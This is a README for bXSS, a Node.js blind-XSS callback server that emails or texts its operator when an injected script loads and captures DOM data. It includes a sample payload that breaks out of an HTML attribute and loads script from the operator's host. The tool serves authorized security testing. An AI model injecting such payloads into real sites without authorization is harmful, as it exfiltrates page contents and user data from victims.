# bXSS

bXSS is a simple Blind XSS application adapted from https://cure53.de/m, you can read about it [here](https://lewisardern.github.io/2017/12/10/blind-xss/).

![Gif of BlindXSS](./Images/cure53.gif)

bXSS will:

* [Email when the resource has been loaded via nodemailer ](./Images/email.jpg)
* [Send a SMS via Twilio](./Images/sms.jpg)
* [Save to disk to review later (If necessary)](./Images/file.jpg)

# Requirements

* A server you control
* A usable domain
* A SSL/TLS Certificate, free from [Lets Encrypt](https://letsencrypt.org) 
* Node.js and Express
* A [Gmail](https://gmail.com) account, to send reports via Nodemailer
* A [Twilio Account](https://www.twilio.com/sms) (Optional) 

# Step-Up

## Default
* cd bXSS && npm install 
* Update The Configuration || Environment Variables 
    * Domain
        * config.url = Domain intended for use e.g ardern.io
        * config.port = Port to run the Node.js app e.g 3030
    * Twilio <b>(Optional, if you don't want to use Twilio just delete all Twilio references from the config)</b> 
        * config.twilio.accountSid =   [Twilio SID](https://support.twilio.com/hc/en-us/articles/223136607-What-is-an-Application-SID)
        * config.twilio.authToken = [Twilio Auth Token](https://support.twilio.com/hc/en-us/articles/223136027-Auth-Tokens-and-how-to-change-them)
        * config.twilio.to = Your telephone number
        * config.twilio.from = [Twilio telephone number](https://support.twilio.com/hc/en-us/articles/223136207-Getting-started-with-your-new-Twilio-phone-number)
    * Gmail
        * config.gmail.user = Gmail Username
        * config.gmail.pass = Gmail Password
        * config.gmail.to = Where you want to send the emails
        * config.gmail.from = Who sent the message, usually Gmail Username
    * Rename configExample.js to config.js
* Start your app (depending on your preference)
    * node app.js
    * pm2 start app.js 
    * nodemon app.js

## Additional Steps

* Obtain a let's Encrypt cert
    * [Manual](https://gist.github.com/davestevens/c9e437afbb41c1d5c3ab)
    * [certbot](https://medium.com/@yash.kulshrestha/using-lets-encrypt-with-express-e069c7abe625)
* I would recommend looking at setting up a [reverse proxy](https://www.nginx.com/resources/glossary/reverse-proxy-server/), for example in [NGINX](https://pastebin.com/nCVSh5iv) and skip the next step as I wouldn't want anyone to run express as root.
* Using Node.js
    * Update Configuration 
        * config.letsEncrypt.TLS = true;
        * config.letsEncrypt.publicKey = $Path/fullchain.pem
        * config.letsEncrypt.privateKey = $Path/privkey.pem
        * config.letsEncrypt.ca = $Path/chain.pem
* Start your app (depending on your preference)
    * node app.js
    * npm2 start app.js 
    * nodemon app.js

# Using

Once the application is funcitonal, you would just identify sites you are authorized to test and start to inject different payloads that will attempt to load your resource, the easiest example is:

```
"><script src="https://example.com/m"></script>
````

The application has three core functions

* POST - /m (captures DOM information)  
* GET - /m (Loads the payload)
* Everything else - Loads alert(1)


# Contribute?

This was more of a fun personal project after seeing the example from [Mario Heiderich's](https://twitter.com/0x6D6172696F) AppSec Europe training and I wanted to have a reason to write more JavaScript and use some ES6. 

This is perfect for my needs, and maybe yours too; I would recommend looking at [Sleepy Puppy](https://github.com/Netflix/sleepy-puppy) or [XSS Hunter](https://xsshunter.com/features) to see if they are appropriate as they are extremly easy to get started with, especially XSS Hunter's online version. 

If you like the project, feel free to contribute or if you want to suggest improvements or notice any problems, file a [issue](https://github.com/LewisArdern/bXSS/issues).
